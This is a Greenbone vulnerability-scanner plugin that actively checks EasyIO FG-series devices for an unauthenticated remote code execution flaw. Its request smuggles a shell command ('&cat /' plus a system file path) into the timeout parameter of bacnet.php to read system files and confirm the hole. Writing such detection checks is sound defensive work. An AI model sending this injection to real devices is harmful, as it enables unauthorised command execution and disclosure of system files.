# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:easyio:easyio";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140106");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2016-12-28 14:42:25 +0100 (Wed, 28 Dec 2016)");
  script_name("EasyIO Multiple Vulnerabilities (Dec 2016)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_dependencies("gb_EasyIO_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("easyio/installed");

  script_xref(name:"URL", value:"https://ssd-disclosure.com/ssd-advisory-easyio-multiple-vulnerabilities/");

  script_tag(name:"summary", value:"EasyIO FG-series devices are prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - Unauthenticated remote code execution

  - Unauthenticated database file download

  - Authenticated directory traversal vulnerability");

  script_tag(name:"solution", value:"Check with the vendor for fixed firmware versions.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = "/sdcard/cpt/scripts/bacnet.php?action=discoverDevices&lowLimit=0&highLimit=0&timeout=0%26cat%20/" + file;

  req = http_get_req( port:port, url:url,
                      add_headers: make_array( "X-Requested-With", "XMLHttpRequest" ) );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( egrep( string:buf, pattern:pattern ) && "SUCCESS" >< buf ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
